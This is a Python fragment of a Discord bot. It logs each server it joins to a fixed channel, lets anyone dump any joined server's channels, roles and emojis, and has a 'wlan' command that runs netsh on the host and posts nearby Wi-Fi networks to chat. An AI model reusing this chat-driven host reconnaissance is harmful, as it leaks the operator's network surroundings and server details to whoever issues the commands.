@bot.event
async def on_guild_join(guild):
    specific_guild_id = 1000796001541570670
    specific_channel_id = 1205819712013869056

    channel = bot.get_channel(specific_channel_id)
    if channel is not None:
        if channel.permissions_for(guild.me).send_messages:
            await channel.send(f"Hallo! Ich bin dem Server '{guild.name}' (ID: {guild.id}) beigetreten.")
        else:
            print("Bot hat keine Berechtigung, Nachrichten in diesem Kanal zu senden.")
    else:
        print(f"Kanal mit der ID {specific_channel_id} wurde nicht gefunden.")

        print(f"Bot ist einem anderen Server beigetreten: {guild.name} (ID: {guild.id})")

@bot.command()
async def serverinfo(ctx, server_id: int):
    server = bot.get_guild(server_id)
    if server is None:
        await ctx.send("Server nicht gefunden.")
        return

    response = ""

    text_channels_without_category = [channel for channel in server.text_channels if channel.category is None]
    voice_channels_without_category = [channel for channel in server.voice_channels if channel.category is None]

    if text_channels_without_category or voice_channels_without_category:
        for channel in text_channels_without_category:
            response += f"    [t] {channel.name}\n"
        for channel in voice_channels_without_category:
            response += f"    [s] {channel.name}\n"

    for category in server.categories:
        response += f"[k] {category.name}\n"
        for channel in category.text_channels:
            response += f"    [t] {channel.name}\n"
        for channel in category.voice_channels:
            response += f"    [s] {channel.name}\n"

    response += "\nRollen:\n"
    for role in server.roles:
        response += f"    {role.name}\n"

    response += "\nSticker:\n"
    for sticker in server.stickers:
        response += f"    {sticker.name}\n"

    response += "\nEmojis:\n"
    for emoji in server.emojis:
        response += f"    {emoji.name}\n"

    chunks = [response[i:i+1900] for i in range(0, len(response), 1900)]
    for chunk in chunks:
        await ctx.send(chunk)

@bot.command(help="show all available WLAN connections")
async def wlan(ctx):
    async def get_wifi_networks():
        try:
            result = subprocess.run(["netsh", "wlan", "show", "network"], capture_output=True)
            output = result.stdout
            if output:
                output = output.decode('utf-8', errors='ignore')
                networks = output.split("\n")
                return networks
            else:
                return ["Error: No output from command."]
        except Exception as e:
            return ["Error:", str(e)]

    networks = await get_wifi_networks()
    ssid_info = {}
    current_ssid = None

    for line in networks:
        if "SSID" in line:
            current_ssid = line.split(" : ")[1].strip()
            ssid_info[current_ssid] = []
        elif current_ssid:
            ssid_info[current_ssid].append(line.strip())

    if ssid_info:
        for ssid, info in ssid_info.items():
            message = f"SSID: {ssid}\n"
            message += "\n".join(info)
            await ctx.send(message)
    else:
        await ctx.send("No WLAN networks found.")

bot.run(TOKEN)
